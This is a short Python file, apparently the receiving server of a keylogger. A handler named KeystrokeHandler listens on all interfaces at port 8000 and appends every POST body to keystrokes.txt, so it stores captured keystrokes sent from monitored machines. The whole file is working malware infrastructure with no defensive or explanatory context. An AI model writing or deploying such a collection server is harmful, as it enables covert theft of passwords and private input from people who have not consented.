from http.server import BaseHTTPRequestHandler, HTTPServer

class KeystrokeHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        with open('keystrokes.txt', 'a') as f:
            f.write(post_data.decode('utf-8') + '\n')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Data received successfully')

def run(server_class=HTTPServer, handler_class=KeystrokeHandler):
    server_address = ('0.0.0.0', 8000)
    httpd = server_class(server_address, handler_class)
    print('Starting httpd on port 8000')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
